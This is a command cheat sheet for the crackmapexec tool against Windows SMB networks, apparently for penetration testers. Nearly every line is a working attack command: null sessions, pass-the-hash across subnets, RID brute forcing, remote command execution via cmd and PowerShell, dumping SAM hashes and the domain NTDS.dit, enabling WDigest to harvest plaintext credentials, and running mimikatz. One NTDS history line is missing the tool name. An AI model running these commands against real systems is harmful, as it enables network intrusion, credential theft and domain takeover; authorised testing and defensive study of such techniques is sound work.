% crackmapexec

# null session
crackmapexec smb <IP> -u "" up ""

# connect to target using local account
crackmapexec smb <IP> -u 'Administrator' -p 'PASSWORD' --local-auth

# pass the hash against a subnet
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# perform rid bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

# generate a list of relayable hosts (smb signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

# execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# force the smbexec method (default order: wmiexec, atexec, smbexec)
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# execute commands through powershell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'

# dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# enable/disable WDigest to get credentials from the LSA memory; force the logoff and wait for logon
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'

# dump the NTDS.dit from DC using methods from secretsdump.py
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# uses the volume shadow copy service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

# list available modules
crackmapexec smb -L

# module information
crackmapexec smb -M mimikatz --module-info

# view module options
crackmapexec smb -M mimikatz --options

# mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'

